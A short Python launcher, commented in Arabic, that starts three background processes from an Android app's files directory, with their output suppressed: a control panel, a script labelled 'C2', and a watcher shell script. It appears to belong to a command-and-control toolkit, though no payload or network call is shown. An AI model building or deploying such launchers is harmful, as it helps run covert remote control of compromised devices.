import subprocess
import os

def start_server():
    # نسخ جميع ملفات المشروع من الأصول إلى المجلد القابل للتنفيذ
    # ثم تشغيل ghost_panel_full.py
    home = "/data/data/com.ghostx.ultimate/files"
    os.chdir(home)
    # بدء لوحة القيادة
    subprocess.Popen(["python3", os.path.join(home, "ghost_panel_full.py")],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # بدء C2
    subprocess.Popen(["python3", os.path.join(home, "c2_viewer.py")],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # بدء المراقب
    subprocess.Popen(["bash", os.path.join(home, "ghost_watcher.sh")],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
